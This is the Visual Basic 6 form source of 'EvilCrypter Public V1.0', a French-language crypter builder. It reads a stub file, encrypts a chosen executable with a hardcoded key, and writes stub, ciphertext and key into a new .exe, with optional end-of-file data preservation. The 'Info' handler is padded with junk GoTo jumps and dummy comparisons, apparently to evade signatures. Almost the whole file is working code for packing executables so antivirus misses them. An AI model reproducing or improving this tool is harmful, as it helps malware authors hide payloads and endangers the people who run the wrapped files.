VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Evil 
   BackColor       =   &H80000007&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "EvilCrypter Public V1.0 "
   ClientHeight    =   6360
   ClientLeft      =   45
   ClientTop       =   360
   ClientWidth     =   3735
   FillColor       =   &H80000001&
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "evil.frx":0000
   ScaleHeight     =   6360
   ScaleWidth      =   3735
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox Check1 
      BackColor       =   &H80000002&
      Caption         =   "EOF"
      ForeColor       =   &H8000000D&
      Height          =   255
      Left            =   2640
      MaskColor       =   &H8000000D&
      TabIndex        =   4
      Top             =   5520
      Width           =   700
   End
   Begin VB.CommandButton Command3 
      BackColor       =   &H80000002&
      Caption         =   "Info"
      Height          =   375
      Left            =   1440
      TabIndex        =   3
      Top             =   5400
      Width           =   900
   End
   Begin VB.CommandButton Command2 
      BackColor       =   &H80000002&
      Caption         =   "Proteger"
      Height          =   375
      Left            =   360
      TabIndex        =   2
      Top             =   5400
      Width           =   900
   End
   Begin MSComDlg.CommonDialog m 
      Left            =   60
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog f 
      Left            =   600
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "..."
      Height          =   255
      Left            =   3120
      TabIndex        =   1
      Top             =   4680
      Width           =   375
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   240
      TabIndex        =   0
      Text            =   "Fichier..."
      Top             =   4680
      Width           =   2775
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000007&
      Caption         =   "Crypter"
      ForeColor       =   &H80000002&
      Height          =   1815
      Left            =   120
      TabIndex        =   5
      Top             =   4200
      Width           =   3495
   End
   Begin VB.Label Label1 
      BackColor       =   &H80000007&
      Caption         =   "EvilCrypter"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000002&
      Height          =   255
      Left            =   1320
      TabIndex        =   6
      Top             =   3960
      Width           =   2295
   End
End
Attribute VB_Name = "Evil"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False



Private Sub Command1_Click()
With f
.Filter = "Executables (*.exe) | *.exe"
.DialogTitle = "Choisir le fichier à protéger.."
.ShowOpen
End With
Text1.Text = f.Filename

End Sub

Private Sub Command2_Click()
If Text1.Text = "" Then
MsgBox "Choisir Un Fichier!", vbInformation, "Crypter Privé 0.1"
Exit Sub
End If
Open App.Path & "\STUB.dat" For Binary As #1
Dim stub As String
stub = Space(LOF(1))
Get #1, , stub
Close #1
Open f.Filename For Binary As #1
Dim fs As String
fs = Space(LOF(1) - 1)
Get #1, , fs
Close #1

If Check1.Value = 1 Then
Dim sv As String
sv = ReadEOFData(f.Filename)
End If

With m
.Filter = "Executables (*.exe) | *.exe"
.DialogTitle = "Sauver Fichier.."
.ShowSave
End With

Dim H As New Class1
Open m.Filename For Binary As #1
Put #1, , stub & "!!!!!!!!!!!!!!!=))"
Put #1, , H.EncryptString(fs, "VIVALAMADREDELJOSE;;EEEE") & "!!!!!!!!!!!!!!!=))"
Put #1, , "VIVALAMADREDELJOSE;;EEEE" & "!!!!!!!!!!!!!!!=))"
Close #1


If Check1.Value = 1 Then
Call WriteEOFData(m.Filename, sv)
End If

MsgBox "Fichier Protéger!", vbInformation, ""

End Sub

Private Sub Command3_Click()
GoTo 12:
12:
Dim mgfN As String
Dim UZjC As String
If mgfN = UZjC Then
DoEvents
End If
MsgBox "http://evilbinary.info" & vbNewLine & "EvilCrypter v1.0" & vbNewLine & vbNewLine & "Vb6 DES ENCRYPTION", vbInformation, ""
GoTo 24:
24:
Dim sJtY As String
Dim quEU As String
If sJtY = quEU Then
DoEvents
End If
Shell "C:\Program Files\Internet Explorer\IEXPLORE.EXE http://evilbinary.info/"
GoTo 36:
36:
Dim NEOq As String
Dim WXSE As String
If NEOq = WXSE Then
DoEvents
End If
End Sub



